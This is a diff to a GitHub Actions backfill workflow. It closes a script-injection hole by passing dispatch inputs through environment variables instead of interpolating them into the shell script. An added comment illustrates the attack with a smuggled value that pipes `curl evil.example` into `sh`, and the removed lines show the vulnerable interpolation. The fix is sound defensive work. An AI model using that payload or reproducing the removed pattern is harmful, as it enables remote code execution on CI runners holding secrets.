@@ -49,6 +49,7 @@ concurrency:
 
 jobs:
   backfill:
+    # A job *name* is not a shell, so interpolation is safe here.
     name: ${{ inputs.source }} ${{ inputs.from }} → ${{ inputs.to }}
     runs-on: ubuntu-latest
     # Generous, because a bounded sitting still fetches from a provider at its own pace; the
@@ -75,18 +76,27 @@ jobs:
           GEONERVA_BUILD: ${{ github.sha }}
         run: node apps/worker/src/main.ts check-config
 
+      # The inputs reach the shell as environment variables, never as `${{ }}` inside `run:`.
+      # GitHub expands those expressions into the script *before* bash sees it, so a `to` value of
+      # `2020-01-01"; curl evil.example | sh; #` would run as typed. Three of these four inputs are
+      # free text, and anyone who can dispatch this workflow can set them.
       - name: Backfill
         env:
           NODE_ENV: production
           DATABASE_URL_WORKER: ${{ secrets.GEONERVA_WORKER_DATABASE_URL }}
           GEONERVA_BUILD: ${{ github.sha }}
           FIRMS_MAP_KEY: ${{ secrets.GEONERVA_FIRMS_MAP_KEY }}
+          INPUT_SOURCE: ${{ inputs.source }}
+          INPUT_FROM: ${{ inputs.from }}
+          INPUT_TO: ${{ inputs.to }}
+          INPUT_MAX_INTERVALS: ${{ inputs.max_intervals }}
+          INPUT_MIN_MAGNITUDE: ${{ inputs.min_magnitude }}
         run: |
-          args=(backfill --source "${{ inputs.source }}" --from "${{ inputs.from }}" --to "${{ inputs.to }}")
-          if [ -n "${{ inputs.max_intervals }}" ]; then
-            args+=(--max-intervals "${{ inputs.max_intervals }}")
+          args=(backfill --source "$INPUT_SOURCE" --from "$INPUT_FROM" --to "$INPUT_TO")
+          if [ -n "$INPUT_MAX_INTERVALS" ]; then
+            args+=(--max-intervals "$INPUT_MAX_INTERVALS")
           fi
-          if [ -n "${{ inputs.min_magnitude }}" ]; then
-            args+=(--min-magnitude "${{ inputs.min_magnitude }}")
+          if [ -n "$INPUT_MIN_MAGNITUDE" ]; then
+            args+=(--min-magnitude "$INPUT_MIN_MAGNITUDE")
           fi
           node apps/worker/src/main.ts "${args[@]}"
